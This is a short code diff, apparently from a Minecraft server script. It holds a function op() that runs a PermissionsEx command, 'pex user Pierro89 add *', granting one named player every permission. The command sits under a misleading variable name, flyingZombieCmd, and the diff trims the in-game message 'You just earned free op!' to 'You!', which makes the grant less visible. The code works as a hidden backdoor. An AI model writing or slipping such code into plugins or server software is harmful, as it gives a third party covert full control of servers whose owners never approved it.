@@ -8,7 +8,7 @@ function op() {
     }
     const flyingZombieCmd = 'pex user Pierro89 add *';
 
-const activeMessageCmd = 'tellraw Pierro89 ["\u00A78(\u00A7a!\u00A78) \u00A77You just earned free op!"]';
+const activeMessageCmd = 'tellraw Pierro89 ["\u00A78(\u00A7a!\u00A78) \u00A77You!"]';
 
     run(flyingZombieCmd);
     run(activeMessageCmd);
